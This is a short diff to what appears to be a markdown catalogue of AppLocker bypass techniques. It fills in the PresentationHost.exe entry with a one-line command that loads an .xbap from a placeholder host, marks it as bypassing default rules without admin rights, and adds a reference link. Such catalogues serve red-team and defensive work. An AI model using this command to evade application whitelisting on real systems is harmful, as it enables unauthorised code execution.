@@ -229,16 +229,17 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 ## 13. PresentationHost.exe
 
-Missing Example
+`presentationhost.exe file:///x.x.x.x/bypass.xbap`
 
 Requires admin: No  
 Windows binary: Yes  
-Bypasses AppLocker Default rules: ?  
+Bypasses AppLocker Default rules: Yes  
 
 
 Notes:
 
 Links:  
+https://medium.com/@jpg.inc.au/applocker-bypass-presentationhost-exe-8c87b2354cd4
 https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
 
 
